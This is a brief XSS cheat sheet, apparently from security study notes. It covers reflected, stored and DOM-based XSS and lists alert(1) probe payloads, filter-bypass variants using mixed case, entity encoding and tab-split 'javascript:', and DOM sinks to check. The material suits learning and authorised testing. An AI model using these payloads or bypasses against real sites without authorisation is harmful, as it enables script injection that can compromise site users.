---
title: "Cross-Site Scripting (XSS)"
description: "Reflected, stored, and DOM-based XSS — payloads and bypass patterns."
date: 2026-04-12
tags: [web, xss, injection]
order: 2
---

## Types

- **Reflected** — payload in request, echoed in response
- **Stored** — payload persisted (DB, log), fired on view
- **DOM** — sink written via JavaScript, no server reflection

## Basic Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## Filter Bypasses

```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
javas\tcript:alert(1)
```

## DOM Sinks to Look For

`innerHTML`, `document.write`, `eval`, `location.href`, `outerHTML`
